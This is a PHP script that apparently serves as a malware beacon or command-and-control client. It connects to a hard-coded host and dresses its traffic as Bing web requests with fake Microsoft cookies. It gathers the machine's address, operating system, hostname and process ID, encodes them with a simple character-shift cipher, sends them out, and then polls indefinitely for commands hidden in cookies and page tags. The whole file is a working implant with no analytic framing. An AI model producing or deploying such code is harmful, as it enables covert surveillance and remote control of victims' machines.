<?php 

function Set_Send_Data($Request="GET",$UrlPath="",$Data="",$headers=""){
    $Init_Conn_Pass=array("MicrosoftAppCrsID=C5E2329D565B4B0A9018CADE484A4704",
    "MicrosoftAppCrsID=FEA8B7C2417163EB8A9A004C87B93DBA",
    "MicrosoftAppCrsID=7868C2B99F22E1C1BCD43DAB1014FA8A",
    "MicrosoftAppCrsID=4C33529F074AD0D5E65E41DDABEF2F28",
    "MicrosoftAppCrsID=EEAAC865731D40131CE88804FF23AE2D",
    "MicrosoftAppCrsID=1EEAE0EE47CA92FCE923BF30834BAD02",
    "MicrosoftAppCrsID=F13C1971DDECAACBA44DA0667E385FFF");
    $Random_Pass=rand(0,count($Init_Conn_Pass)-1);
    
    $Data=$Request.' /'.$UrlPath." HTTP/1.1\r\nHost: bing.com\r
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\r
Cookie: ".$Init_Conn_Pass[$Random_Pass]."\r
Accept-Language: en-US,en;q=0.5\r
Accept-Encoding: gzip, deflate\r
Connection: keep-alive\r
Upgrade-Insecure-Requests: 1\r
".$headers."\r
\r
".$Data;
 
    return $Data;
}

function Data_Encrypt($Data){
    $Encrypt_Data='';
    $len=strlen($Data);
    #echo $len;
    for($i=0;$i<$len;$i++){
        $Encrypt_Data=$Encrypt_Data.chr(ord($Data[$i])+1);
    }
    $Encrypt_Data=strrev($Encrypt_Data);
    return $Encrypt_Data;
}

function Data_Decrypt($Data){
    $Decrypt_Data='';
    $len=strlen($Data);
    #echo $len;
    for($i=0;$i<$len;$i++){
        $Decrypt_Data=$Decrypt_Data.chr(ord($Data[$i])-1);
    }
    $Decrypt_Data=strrev($Decrypt_Data);
    return $Decrypt_Data;
}

function Handle_Cookie($Data){
    preg_match_all("/Cookie:(.*)\n/U",$Data,$Cookie_list);
    $Cookie_list=$Cookie_list[1][0];
    $Cookie_Data=preg_split("/;/",$Cookie_list);
    for($i=0;$i<count($Cookie_Data);$i++){
        if(strstr($Cookie_Data[$i],"CRSameSite=")){
            return substr($Cookie_Data[$i],12); 
        }
    }
    return false;

}

function My_Socket(){
    $SystemName=PHP_OS;
    $Pid=posix_getpid();
    $Host="192.168.8.128";
    $Port=80;
    $BUfsize=1024;
    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    $result = socket_connect($socket, $Host, $Port);
    socket_getsockname($socket,$Lan);
    $HostName=gethostbyaddr($Lan);
    $Systeminfo=$Lan.",".$SystemName.",".$HostName.",".$Pid;
    $Send_Data=Set_Send_Data();
    socket_write($socket,$Send_Data,strlen($Send_Data));
    $Recv_Data= socket_read($socket, $BUfsize);
    #echo $Recv_Data;
    $Return_Handle=Handle_Cookie($Recv_Data);
    if($Return_Handle){
        #echo $Return_Handle;
        if(strcmp($Return_Handle,"Go_Online")){
            $Systeminfo=Data_Encrypt($Systeminfo);
            $Systeminfo='<T>'.$Systeminfo.'</T>';
            $Send_Data=Set_Send_Data($Request="POST",$UrlPath="fd/ls/lsp.aspx",$Data=$Systeminfo,$headers='Content-Type: text/xml');
            socket_write($socket,$Send_Data,strlen($Send_Data));
        }
    }

    while(True){
        sleep(2);
        $UrlPath="search?q=".$Pid."A";
        $Send_Data=Set_Send_Data($Request="GET",$UrlPath=$UrlPath);
        socket_write($socket,$Send_Data,strlen($Send_Data));
        $Return_Data=socket_read($socket,$BUfsize);
        #echo $Return_Data;
        echo substr($Return_Data,-7);
        while(True){
            $Data_End=substr($Return_Data,-7);
            if(strcmp($Data_End,"</html>")){
                echo "1111";
                break;
            }
            $Return_Data=$Return_Data.socket_read($socket,$BUfsize);
        }
        
        $Return_Handle=Handle_Cookie($Return_Data);
        if($Return_Handle){
            if(strcmp($Return_Handle,"Go_Speeck")){
                preg_match_all("/<javascript>(.*)</javascript>/",$Return_Data,$Specck);
                print_r($Specck);
            }
        }
    }
    
}
My_Socket();

?>